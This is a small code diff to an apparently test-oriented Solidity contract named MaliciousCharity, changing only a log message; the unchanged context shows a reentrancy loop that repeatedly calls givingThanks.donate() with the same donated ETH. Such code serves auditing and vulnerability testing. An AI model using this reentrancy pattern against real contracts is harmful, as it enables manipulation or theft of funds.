@@ -18,7 +18,7 @@ contract MaliciousCharity {
 
         if (reentrancyCount < ATTACK_ROUNDS) {
             reentrancyCount++;
-            console.log("reentrancy count:", reentrancyCount);
+            console.log("Number of reentrancy attempts:", reentrancyCount);
             // Use the same donated ETH to repeatedly call givingThanks.donate()
             givingThanks.donate{value: msg.value}(address(this));
         }
